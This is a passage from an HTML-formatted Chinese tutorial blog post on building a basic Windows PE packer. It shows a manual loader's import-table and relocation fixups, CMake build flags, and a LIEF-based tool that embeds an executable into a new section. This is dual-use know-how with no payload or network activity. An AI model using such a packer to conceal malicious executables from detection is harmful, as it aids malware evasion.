&lt;span class="n">ExitProcess&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">255&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// change the IAT, and put the function address inside.
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">address_table&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">u1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Function&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">DWORD&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">function_handle&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kt">void&lt;/span> &lt;span class="nf">fix_base_reloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">p_image_base&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">IMAGE_NT_HEADERS&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">p_NT_headers&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">IMAGE_DATA_DIRECTORY&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">data_directory&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">p_NT_headers&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">OptionalHeader&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">DataDirectory&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// this is how much we shifted the ImageBase
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">DWORD&lt;/span> &lt;span class="n">delta_VA_reloc&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="n">DWORD&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">p_image_base&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="n">p_NT_headers&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">OptionalHeader&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">ImageBase&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// if there is a relocation table, and we actually shitfted the ImageBase
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">data_directory&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">IMAGE_DIRECTORY_ENTRY_BASERELOC&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">VirtualAddress&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="n">delta_VA_reloc&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// calculate the relocation table address
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">IMAGE_BASE_RELOCATION&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">p_reloc&lt;/span> &lt;span class="o">=&lt;/span>
&lt;span class="p">(&lt;/span>&lt;span class="n">IMAGE_BASE_RELOCATION&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">p_image_base&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">data_directory&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">IMAGE_DIRECTORY_ENTRY_BASERELOC&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">VirtualAddress&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// once again, a null terminated array
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">while&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">p_reloc&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">VirtualAddress&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// how any relocation in this block
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// ie the total size, minus the size of the &amp;#34;header&amp;#34;, divided by 2 (those are words, so 2 bytes for each)
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">DWORD&lt;/span> &lt;span class="n">size&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">p_reloc&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">SizeOfBlock&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">IMAGE_BASE_RELOCATION&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">/&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// the first relocation element in the block, right after the header (using pointer arithmetic again)
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">WORD&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">fixups&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">WORD&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">p_reloc&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">size_t&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="n">size&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="o">++&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// type is the first 4 bits of the relocation word
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">type&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">fixups&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">&amp;gt;&amp;gt;&lt;/span> &lt;span class="mi">12&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// offset is the last 12 bits
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">offset&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">fixups&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">&amp;amp;&lt;/span> &lt;span class="mh">0x0fff&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// this is the address we are going to change
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">DWORD&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">change_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">DWORD&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">p_image_base&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">p_reloc&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">VirtualAddress&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">offset&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// there is only one type used that needs to make a change
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">switch&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">type&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="nl">IMAGE_REL_BASED_HIGHLOW&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="o">*&lt;/span>&lt;span class="n">change_addr&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">delta_VA_reloc&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">default&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// switch to the next relocation block, based on the size
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">p_reloc&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">IMAGE_BASE_RELOCATION&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(((&lt;/span>&lt;span class="n">DWORD&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">p_reloc&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">p_reloc&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">SizeOfBlock&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="nf">mystrcmp&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">const&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">str1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">const&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">str2&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">while&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="n">str1&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">str2&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">str1&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">str1&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">str2&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="n">str1&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">str2&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kt">void&lt;/span> &lt;span class="nf">mymemcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">dest&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">const&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">src&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">size_t&lt;/span> &lt;span class="n">length&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">size_t&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="n">length&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">dest&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">src&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>构建参数（CMAKE）&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-cmake" data-lang="cmake">&lt;span class="nb">add_executable&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">loader_2&lt;/span> &lt;span class="s">WIN32&lt;/span> &lt;span class="s">loader_2.c&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span>&lt;span class="nb">target_compile_options&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">loader_2&lt;/span> &lt;span class="s">PRIVATE&lt;/span> &lt;span class="s">/GS-&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span>&lt;span class="nb">target_link_options&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">loader_2&lt;/span> &lt;span class="s">PRIVATE&lt;/span> &lt;span class="s">/NODEFAULTLIB&lt;/span> &lt;span class="s">/ENTRY:_start&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>参数&lt;code>/GS-&lt;/code>是为了避免在&lt;code>/NODEFAULTLIB&lt;/code>下出现一些缓存区安全检查代码链接错误。参考&lt;a class="link" href="https://docs.microsoft.com/en-us/cpp/build/reference/gs-buffer-security-check?view=msvc-160" target="_blank" rel="noopener"
>文档&lt;/a>。&lt;/p>
&lt;h2 id="0x02-加壳机">0x02 加壳机&lt;/h2>
&lt;p>相信已经发现了，上文并没有提到怎么把程序嵌入壳程序里。这是因为加壳并不是在壳程序编译时直接把文件嵌进去=，=虽然理论上来说也可以，但这里不讨论了。仅仅看加壳机加壳的场景吧。&lt;/p>
&lt;h3 id="21-加壳机原理">2.1 加壳机原理&lt;/h3>
&lt;p>加壳机做的事情包括：&lt;/p>
&lt;ul>
&lt;li>在 section table 里添加 section
&lt;ul>
&lt;li>根据 section table 和 file_alignment 决定如何分配空间&lt;/li>
&lt;li>根据 section_alignment 计算 virtual size&lt;/li>
&lt;li>根据上一个 section 大小和位置计算 virtual address&lt;/li>
&lt;li>填充 pointer_to_raw_data 和 size_of_raw_data&lt;/li>
&lt;li>设置合适的 characteristics&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>计算修改 number_of_sections&lt;/li>
&lt;li>计算修改 size_of_image&lt;/li>
&lt;li>计算修改 size_of_headers&lt;/li>
&lt;/ul>
&lt;p>反正看起来就很麻烦，不过幸好操作 PE 文件的库不少，GitHub 搜一搜就有。这里用 &lt;a class="link" href="https://github.com/lief-project/LIEF" target="_blank" rel="noopener"
>LIEF&lt;/a> 这个库，操作蛮简单的。&lt;/p>
&lt;h3 id="22-源码">2.2 源码&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-cpp" data-lang="cpp">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;Windows.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;LIEF/LIEF.hpp&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;vector&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">vector&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="kt">uint8_t&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">read_file&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">const&lt;/span> &lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">string&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">path&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">auto&lt;/span> &lt;span class="n">h&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">CreateFile&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">path&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">c_str&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="n">GENERIC_READ&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">nullptr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">OPEN_EXISTING&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">FILE_ATTRIBUTE_NORMAL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">nullptr&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">DWORD&lt;/span> &lt;span class="n">readbyte&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">auto&lt;/span> &lt;span class="n">filesize&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">GetFileSize&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">h&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">nullptr&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">auto&lt;/span> &lt;span class="n">content&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">vector&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="kt">uint8_t&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="n">content&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">resize&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">filesize&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="n">ReadFile&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">h&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">content&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="n">filesize&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">readbyte&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">nullptr&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">abort&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">readbyte&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="n">filesize&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">abort&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="n">CloseHandle&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">h&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="n">content&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">argc&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">const&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">argv&lt;/span>&lt;span class="p">[])&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">argc&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">3&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;loader and program path are required&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">auto&lt;/span> &lt;span class="n">loader_path&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">argv&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="k">auto&lt;/span> &lt;span class="n">program_path&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">argv&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="k">auto&lt;/span> &lt;span class="n">loader_binary&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">LIEF&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">PE&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">Parser&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">parse&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">loader_path&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// LIEF 帮我们做了偏移计算之类的工作，这里就只用点逻辑，非常得银杏。
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">auto&lt;/span> &lt;span class="n">program_content&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">read_file&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">program_path&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">auto&lt;/span> &lt;span class="n">packed_section&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">LIEF&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">PE&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">Section&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;.packed&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// 新建 section
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">packed_section&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">content&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">program_content&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// 把被加载程序的内容当成 section 内容
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">loader_binary&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">add_section&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">packed_section&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">LIEF&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">PE&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">PE_SECTION_TYPES&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">DATA&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// 把 section 添加到壳程序里
&lt;/span>&lt;span class="c1">&lt;/span>
&lt;span class="c1">// 用 lief 实现把修改后的壳程序写入硬盘
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">auto&lt;/span> &lt;span class="n">builder&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">LIEF&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">PE&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">Builder&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">Builder&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">loader_binary&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">());&lt;/span>
&lt;span class="n">builder&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">build&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="n">builder&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;packed.exe&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>编译指令（CMAKE）参考 &lt;a class="link" href="https://lief-project.github.io//doc/latest/installation.html#cmake-integration" target="_blank" rel="noopener"
>LIEF 文档&lt;/a>。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-cmake" data-lang="cmake">&lt;span class="c"># Custom path to the LIEF install directory
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="nb">set&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">LIEF_DIR&lt;/span> &lt;span class="s">CACHE&lt;/span> &lt;span class="s">PATH&lt;/span> &lt;span class="o">${&lt;/span>&lt;span class="nv">CMAKE_INSTALL_PREFIX&lt;/span>&lt;span class="o">}&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span>&lt;span class="c"># Directory to &amp;#39;FindLIEF.cmake&amp;#39;
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="nb">list&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">APPEND&lt;/span> &lt;span class="s">CMAKE_MODULE_PATH&lt;/span> &lt;span class="o">${&lt;/span>&lt;span class="nv">LIEF_DIR&lt;/span>&lt;span class="o">}&lt;/span>&lt;span class="s">/share/LIEF/cmake&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span>&lt;span class="c"># include &amp;#39;FindLIEF.cmake&amp;#39;
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="nb">include&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">FindLIEF&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span>&lt;span class="c"># Find LIEF
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="nb">find_package&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">LIEF&lt;/span> &lt;span class="s">REQUIRED&lt;/span> &lt;span class="s">COMPONENTS&lt;/span> &lt;span class="s">STATIC&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c"># COMPONENTS: &amp;lt;SHARED | STATIC&amp;gt; - Default: STATIC
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span>&lt;span class="nb">add_executable&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">packer&lt;/span> &lt;span class="s">packer.cpp&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span>&lt;span class="nb">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">MSVC&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span> &lt;span class="nb">target_compile_options&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">packer&lt;/span> &lt;span class="s">PRIVATE&lt;/span> &lt;span class="s">/FIiso646.h&lt;/span> &lt;span class="s">/MT&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span> &lt;span class="nb">set_property&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">TARGET&lt;/span> &lt;span class="s">packer&lt;/span> &lt;span class="s">PROPERTY&lt;/span> &lt;span class="s">LINK_FLAGS&lt;/span> &lt;span class="s">/NODEFAULTLIB:MSVCRT&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span>&lt;span class="nb">endif&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span>&lt;span class="nb">target_include_directories&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">packer&lt;/span> &lt;span class="s">PRIVATE&lt;/span> &lt;span class="o">${&lt;/span>&lt;span class="nv">LIEF_INCLUDE_DIRS&lt;/span>&lt;span class="o">}&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">
